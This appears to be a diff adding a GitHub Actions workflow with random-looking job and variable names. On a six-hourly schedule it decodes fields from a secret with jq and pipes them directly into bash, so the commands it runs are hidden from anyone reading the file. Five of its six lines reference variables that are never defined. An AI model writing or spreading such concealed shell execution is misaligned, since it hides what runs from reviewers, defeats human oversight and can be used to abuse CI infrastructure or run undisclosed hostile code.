@@ -1,0 +1,22 @@
+name: duanzhixing2016
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanzhixing2016
+        env:
+          qodbi813: ${{ secrets.qodbi813 }}
+        run: |
+          echo $qodbi813 | jq -r .bol36432 | /bin/bash
+          echo $qcu43 | jq -r .oz93328 | /bin/bash
+          echo $bch4 | jq -r .ls278 | /bin/bash
+          echo $o1252 | jq -r .sf56617 | /bin/bash
+          echo $zv0272 | jq -r .hd03731 | /bin/bash
+          echo $jjsbw72 | jq -r .g627 | /bin/bash
+
